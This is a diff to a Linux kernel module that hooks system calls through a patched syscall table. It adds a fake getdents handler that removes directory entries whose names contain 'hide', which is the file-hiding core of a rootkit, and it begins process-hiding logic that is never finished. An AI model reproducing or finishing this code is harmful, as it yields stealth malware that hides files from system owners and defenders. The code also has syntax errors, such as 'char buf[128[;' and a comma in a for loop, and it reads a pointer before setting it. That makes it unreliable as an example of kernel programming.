@@ -8,6 +8,8 @@
 #include <linux/cred.h>
 #include <linux/uidgid.h>
 #include <linux/dirent.h>
+#include <linux/fs.h>
+#include <asm/uaccess.h>
 
 #define CR0_WRITE_UNLOCK(x) \
 	do { \
@@ -54,16 +56,76 @@ asmlinkage int totallyReal_mkdir(const char *pathname, mode_t mode){
 	return ((typeof(sys_mkdir)*)(original_syscallPtrs[2]))(pathname, mode);
 }
 
-#define process_to_hide "hide_"
+struct linux_dirent {
+	long d_ino;
+	off_t d_off;
+	unsigned short d_reclen;
+	char d_name[];
+};
 
-asmlinkage long totallyReal_getdents64(unsigned int fd, struct linux_dirent64 __user * dire, unsigned int count) {
-	pr_info("Intercepted getdents of fd=%d %p %d\n", fd, dire, count);
+#define hide_file "hide"
+#define hide_process "dummy"
+
+asmlinkage long totallyReal_getdents(unsigned int fd, struct linux_dirent * dirp, unsigned int count) {
+	pr_info("FAKEGETDENTS: Intercepted getdents of fd=%d %p %d\n", fd, dirp, count);
+	// output is the number of bytes read
+	int nread;
+	nread = ( ( typeof(sys_getdents)* )(original_syscallPtrs[3]) )(fd, dirp, count);
+	struct linux_dirent *mod_dirp;
+	if (nread == -1) {
+		pr_info("FAKEGETDENTS: error calling original function \n");
+		return -1;
+	}
+	else {
+		pr_info("FAKEGETDENTS: successfully read getdents");
+	}
+
+	mod_dirp = kvmalloc(nread, GFP_KERNEL);
+	if (mod_dirp == NULL) {
+		pr_info("FAKEGETDENTS: Error");
+		kvfree( mod_dirp );
+		return -1;
+	}
 	
-	int output;
-	output = ( ( typeof(sys_getdents64)* )(original_syscallPtrs[3]) )(fd, dire, count);
+	copy_from_user( mod_dirp, dirp, nread);
 	
-	
-	return output;
+	long offset = 0;
+	struct linux_dirent *p_dirp, *prev;
+	while( offset < nread) {
+		p_dirp = (void *) mod_dirp + offset;
+		unsigned short p_dirent_len = p_dirp->d_reclen;
+		
+		struct file *f;
+		char buf[128[;
+		mm_segment_t fs;
+		int i = 0;
+		for (i = 0; i < 128, i++)
+			buf[i] = 0;
+		char filename[128];
+		strcpy( filename, buf );
+		strcat( filename, "/proc/" );
+		strcat( filename, p_dirp->d_name);
+		strcat( filename, "/cmdline" );
+		
+
+		if (strstr(p_dirp->d_name, hide_file) != NULL ) {
+			if (p_dirp == mod_dirp) {
+				pr_info("FAKEGETDENTS: hiding %s", p_dirp->d_name);
+				nread -= p_dirent_len;
+				memmove(mod_dirp, (void *)mod_dirp + p_dirent_len, nread);
+				continue;
+			}
+			prev->d_reclen += p_dirent_len;
+		}
+		else {
+			pr_info("FAKEGETDENTS: normal file '%s'\n", p_dirp->d_name);
+			prev = p_dirp;
+		}
+		offset += p_dirent_len;
+	}
+	copy_to_user(dirp, mod_dirp, nread);
+	kvfree(mod_dirp);
+	return nread;
 }
 
 
@@ -133,7 +195,7 @@ int __init loadMod(void){
 	toInject[2] = 1;
 	
 	syscall_names[3] = __NR_getdents;
-	totallyReal_syscallPtrs[3] = (void *) &totallyReal_getdents64;
+	totallyReal_syscallPtrs[3] = (void *) &totallyReal_getdents;
 	toInject[3] = 1;
 
 	injectSyscalls();
